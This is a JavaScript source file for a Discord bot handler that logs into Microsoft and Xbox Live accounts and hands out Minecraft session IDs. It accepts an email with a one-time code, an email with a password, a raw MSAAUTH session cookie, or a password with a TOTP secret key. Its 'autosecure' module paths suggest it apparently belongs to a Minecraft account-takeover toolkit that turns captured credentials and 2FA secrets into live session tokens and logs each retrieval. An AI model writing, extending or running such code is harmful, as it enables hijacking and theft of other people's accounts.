const { passwordAuth } = require('../../../autosecure/utils/info/passwordauth');
const generateotp = require('../../../autosecure/utils/secure/codefromsecret');
const HttpClient = require("../../../autosecure/utils/process/HttpClient");
const xbl = require("../../../autosecure/utils/minecraft/xbl");
const ssid = require('../../../autosecure/utils/minecraft/ssid');
const profile = require('../../../autosecure/utils/minecraft/profile');
const login = require('../../../autosecure/utils/secure/login');
const loginpass = require('../../../autosecure/utils/secure/loginpass');
const { logSSID } = require('../../utils/activityLogger');
const validEmail = require("../../../autosecure/utils/emails/validEmail.js");
const getCredentials = require("../../../autosecure/utils/info/getCredentials.js");

module.exports = {
    name: "handlegetssid",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            await interaction.deferReply({ ephemeral: true });
            const [_, method] = interaction.customId.split('|');
            const fields = interaction.fields;

            let sid;
            let skipXBL = false;
            const HttpClientfix = new HttpClient();

            switch (method) {
                case 'emailotp': {
                    const email = fields.getTextInputValue('email');
                    const otp = fields.getTextInputValue('otp');

                    // Validate email
                    if (!validEmail(email)) {
                        return interaction.editReply({
                            embeds: [{
                                title: "Error :x:",
                                description: "Invalid email address!",
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }

                    // Validate OTP
                    if (isNaN(otp) || otp.length < 6 || otp.length > 7) {
                        return interaction.editReply({
                            embeds: [{
                                title: "Error :x:",
                                description: "OTP must be 6-7 digits!",
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }

                    // Get credentials
                    const profiles = await getCredentials(email, false);
                    
                    if (!profiles?.Credentials || !profiles?.Credentials?.OtcLoginEligibleProofs || profiles.Credentials.OtcLoginEligibleProofs.length === 0) {
                        return interaction.editReply({
                            embeds: [{
                                title: "Error :x:",
                                description: "Invalid email / OTP login not available for this account!",
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }

                    // Try to login with OTP
                    let host = null;
                    for (const sec of profiles.Credentials.OtcLoginEligibleProofs) {
                        try {
                            host = await login({ email: email, id: sec.data, code: otp }, profiles);
                            if (host) {
                                break;
                            }
                        } catch (error) {
                            console.error(`Login attempt failed:`, error);
                        }
                    }

                    if (!host) {
                        return interaction.editReply({
                            embeds: [{
                                title: "Error :x:",
                                description: "Failed to login with OTP. Invalid OTP or account locked!",
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }

                    // Get XBL and SSID
                    const xb = await xbl(host);
                    if (!xb || !xb.XBL) {
                        return interaction.editReply({
                            embeds: [{
                                title: "Error :x:",
                                description: "Failed to get Xbox Live token. Account may not have Xbox profile!",
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }

                    sid = await ssid(xb.XBL);
                    if (!sid || ["noxbox", "failed", "tfa", "bad", "unknown"].includes(sid)) {
                        return interaction.editReply({
                            embeds: [{
                                title: "Error :x:",
                                description: `Couldn't get SSID: ${convertToken(sid || "failed")}`,
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }
                    break;
                }
                case 'emailpass': {
                    const email = fields.getTextInputValue('email');
                    const password = fields.getTextInputValue('password');
                    let msauthToken = await loginpass(email, password);

                    if (!msauthToken) {
                        sid = await passwordAuth(email, password);
                        skipXBL = true;
                    } else {
                        HttpClientfix.setCookie(`__Host-MSAAUTH=${msauthToken}`);
                        let loginData = await HttpClientfix.post("https://login.live.com/login.srf");

                        if (loginData.data.includes("accrue") || loginData.data.includes("recover") ||
                            loginData.data.includes("Abuse") || loginData.data.includes("identity/confirm")) {
                            return interaction.editReply({
                                embeds: [{
                                    title: "Error :x:",
                                    description: "Account is locked!",
                                    color: 0xff0000
                                }],
                                ephemeral: true
                            });
                        } else if (loginData.data.includes("cancel")) {
                            sid = await passwordAuth(email, password);
                            skipXBL = true;
                        }
                    }

                    if (!skipXBL) {
                        const xb = await xbl(HttpClientfix);
                        sid = await ssid(xb.XBL);
                    }

                    if (["noxbox", "failed", "tfa", "bad", "unknown"].includes(sid)) {
                        return interaction.editReply({
                            embeds: [{
                                title: "Error :x:",
                                description: `An error occurred: ${convertToken(sid)}`,
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }
                    break;
                }
                case 'msauth': {
                    const msauthToken = fields.getTextInputValue('authcode');
                    HttpClientfix.setCookie(`__Host-MSAAUTH=${msauthToken}`);
                    const xb = await xbl(HttpClientfix);
                    sid = await ssid(xb.XBL);

                    if (["noxbox", "failed", "tfa", "bad", "unknown"].includes(sid)) {
                        return interaction.editReply({
                            embeds: [{
                                title: "Error :x:",
                                description: `An error occurred: ${convertToken(sid)}`,
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }
                    break;
                }

                case 'tfa': {
                    const email = fields.getTextInputValue('email');
                    const password = fields.getTextInputValue('password');
                    const secretkey = fields.getTextInputValue('secretkey');

                    const { otp } = await generateotp(secretkey);
                    const msauthToken = await login({ otp, email, pw: password }, null);

                    if (!msauthToken) {
                        return interaction.editReply({
                            embeds: [{
                                title: `Error :x:`,
                                description: 'Failed to login with 2FA',
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }

                    HttpClientfix.setCookie(`__Host-MSAAUTH=${msauthToken}`);
                    const xb = await xbl(HttpClientfix);
                    sid = await ssid(xb.XBL);

                    if (["noxbox", "failed", "tfa", "bad", "unknown"].includes(sid)) {
                        return interaction.editReply({
                            embeds: [{
                                title: "Error :x:",
                                description: `An error occurred: ${convertToken(sid)}`,
                                color: 0xff0000
                            }],
                            ephemeral: true
                        });
                    }
                    break;
                }

                default:
                    return interaction.editReply({
                        embeds: [{
                            title: `Error :x:`,
                            description: `Invalid method selected`,
                            color: 0xff0000
                        }],
                        ephemeral: true
                    });
            }

            if (!sid) {
                return interaction.editReply({
                    embeds: [{
                        title: `Error :x:`,
                        description: `Couldn't get the SSID (Maybe the user doesn't have Minecraft)`,
                        color: 0xff0000
                    }],
                    ephemeral: true
                });
            }

            const userProfile = await profile(sid);
            if (!userProfile?.name || !userProfile?.uuid) {
                return interaction.editReply({
                    embeds: [{
                        title: `Error :x:`,
                        description: `Account doesn't have Minecraft or profile data is incomplete!`,
                        color: 0xff0000
                    }],
                    ephemeral: true
                });
            }

            // Log SSID retrieval
            await logSSID(client, interaction.user.id, interaction.user.tag, userProfile.name, true).catch(() => {});

            return interaction.editReply({
                embeds: [{
                    title: userProfile.name,
                    description: `\`\`\`${sid}\`\`\``,
                    color: 0xB8D2F0
                }],
                ephemeral: true
            });

        } catch (error) {
            console.error('Error in handlegetssid:', error);
            await interaction.editReply({
                embeds: [{
                    title: `Error :x:`,
                    description: `An error occurred.`,
                    color: 0xff0000
                }],
                ephemeral: true
            });
        }
    }
};

function convertToken(value) {
    const messages = {
        "noxbox": "No Xbox Profile!",
        "failed": "Failed (unknown reason)",
        "tfa": "2FA is enabled!",
        "bad": "Wrong Email/password!",
        "unknown": "Maybe TFA is enabled?"
    };
    return messages[value] || "Unknown error";
}
